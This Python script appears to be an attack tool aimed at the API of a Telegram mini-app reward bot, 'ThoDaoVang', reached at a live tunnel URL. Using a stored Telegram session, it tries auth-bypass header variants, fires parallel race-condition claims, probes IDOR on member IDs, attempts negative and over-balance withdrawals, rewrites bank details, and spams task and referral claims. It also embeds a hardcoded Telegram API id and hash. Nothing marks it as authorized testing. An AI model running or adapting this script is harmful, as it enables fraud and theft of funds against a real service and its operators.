"""Test auth + IDOR + claim loop ThoDaoVang."""
import sys, os, json, time, hmac, hashlib, asyncio
from urllib.parse import parse_qsl, urlencode, unquote
sys.path.insert(0, os.getcwd())
import httpx, storage
storage.init()

BASE = "https://result-gotta-responsibility-firewire.trycloudflare.com"
UA = {"User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Mobile Safari/537.36",
      "Origin": BASE, "Referer": BASE + "/", "content-type": "application/json"}

def load_idata():
    # lay tu cache (initData moi nhat)
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.tl.functions.messages import RequestWebViewRequest
    fox = [a for a in storage.list_accounts() if a.get("uid") == 8249205817][0]
    async def fetch():
        c = TelegramClient(StringSession(fox["session"]), 2040, "b18441a1ff607e10a989891a5462e627")
        await c.connect()
        try:
            bot = await c.get_entity("ThoDaoVang_bot")
            res = await c(RequestWebViewRequest(peer=bot, bot=bot, platform="android",
                url=BASE+"/", from_bot_menu=True, compact=True))
            url = res.url
            fr = url.split("#tgWebAppData=",1)[1].split("&tgWebAppVersion")[0]
            return unquote(fr)
        finally:
            await c.disconnect()
    return asyncio.new_event_loop().run_until_complete(fetch())

idata = load_idata()
print(f"[+] initData len={len(idata)}")

def H(extra=None):
    h = dict(UA); h["X-Telegram-Init-Data"] = idata
    if extra: h.update(extra)
    return h

def get(path, hdrs=None, base=BASE):
    return httpx.get(base+path, headers=H(hdrs), timeout=15, follow_redirects=True)
def post(path, body=None, hdrs=None, base=BASE):
    return httpx.post(base+path, json=body, headers=H(hdrs), timeout=15, follow_redirects=True)

# ============ 1. Auth bypass variants ============
print("\n=== 1. AUTH BYPASS ===")
tests = [
    ("no_header", {}),
    ("empty_init", {"X-Telegram-Init-Data": ""}),
    ("junk_init", {"X-Telegram-Init-Data": "garbage"}),
    ("only_user", {"X-Telegram-Init-Data": "user=%7B%22id%22%3A12345%7D"}),
    ("no_hash", {"X-Telegram-Init-Data": "auth_date="+str(int(time.time()))+"&user=%7B%22id%22%3A8249205817%7D"}),
    ("bad_hash", {"X-Telegram-Init-Data": "auth_date="+str(int(time.time()))+"&user=%7B%22id%22%3A8249205817%7D&hash=deadbeef"}),
    ("lowercase_header", {"x-telegram-init-data": idata}),
    ("header_variant_1", {"X-Init-Data": idata}),
    ("header_variant_2", {"Telegram-Init-Data": idata}),
]
for name, hdrs in tests:
    try:
        r = get("/api/me", hdrs)
        body = r.text[:150]
        print(f"    {name:<22} -> {r.status_code}  {body}")
    except Exception as e:
        print(f"    {name:<22} -> err {str(e)[:60]}")

# ============ 2. Claim loop ============
print("\n=== 2. CLAIM LOOP (10x song song) ===")
from concurrent.futures import ThreadPoolExecutor, as_completed
def claim(i): 
    r = post("/api/claim"); 
    try: return r.status_code, r.json()
    except: return r.status_code, {}
with ThreadPoolExecutor(max_workers=10) as ex:
    res = [f.result() for f in as_completed([ex.submit(claim,i) for i in range(10)])]
total = 0
for s, j in res:
    if j.get("ok"): total += j.get("claimed", 0)
print(f"    claims OK: {sum(1 for s,j in res if j.get('ok'))}/10  total_claimed={total}")

# ============ 3. IDOR member_id ============
print("\n=== 3. IDOR — thu member_id khac ===")
me = get("/api/me").json()
my_mid = me.get("member_id")
print(f"    my member_id: {my_mid}")
# thu vai bien the
for path in [f"/api/me?member_id=1", f"/api/me?id=1", f"/api/user/1", f"/api/me/1",
             f"/api/withdraw/history?member_id=1"]:
    try:
        r = get(path)
        if r.status_code != 404 and r.status_code != 400:
            print(f"    {path} -> {r.status_code}  {r.text[:150]}")
    except Exception: pass

# ============ 4. Withdraw abuse ============
print("\n=== 4. WITHDRAW — so am / vuot balance ===")
for amt in [-1, 0, 1, 99999999999, 2479079.065703, 2479079.07]:
    try:
        r = post("/api/withdraw", {"amount": amt})
        body = r.text[:200].replace("\n"," ")
        print(f"    amount={amt:<15} -> {r.status_code}  {body}")
    except Exception as e:
        print(f"    amount={amt} err {str(e)[:60]}")

# ============ 5. Bank IDOR ============
print("\n=== 5. BANK — doi bank ============")
for body in [
    {"bank_name":"VCB","bank_account":"9999999999","account_name":"HACK"},
    {"bank_name":"VCB","bank_account":"12345678","account_name":"Test"},
    {"bank_name":"","bank_account":"","account_name":""},
]:
    try:
        r = post("/api/bank", body)
        print(f"    {body} -> {r.status_code}  {r.text[:180]}")
    except Exception as e:
        print(f"    err {str(e)[:80]}")

# ============ 6. Task start/claim ============
print("\n=== 6. TASK claim ===")
for t in ["facebook","telegram","youtube","tiktok","instagram","twitter"]:
    try:
        r1 = post("/api/task/start", {"task": t})
        r2 = post("/api/task/claim", {"task": t})
        print(f"    {t:<10} start={r1.status_code} claim={r2.status_code}  {r2.text[:120]}")
    except Exception as e:
        print(f"    {t} err {str(e)[:60]}")

# ============ 7. Payment ============
print("\n=== 7. PAYMENT — thu cac package ===")
for pid in ["starter","basic","pro","vip","1","2","3","gold","bronze","silver"]:
    try:
        r = post("/api/payment/next", {"package_id": pid})
        body = r.text[:150].replace("\n"," ")
        print(f"    pkg={pid:<10} -> {r.status_code}  {body}")
    except Exception as e: pass

# ============ 8. Referral claim spam ============
print("\n=== 8. REFERRAL claim spam ===")
for i in range(5):
    r = post("/api/referral/claim", {})
    try: j = r.json()
    except: j = {}
    print(f"    #{i}: {r.status_code}  {str(j)[:100]}")

# ============ final ============
print("\n=== FINAL ME ===")
print(f"    {get('/api/me').text[:300]}")
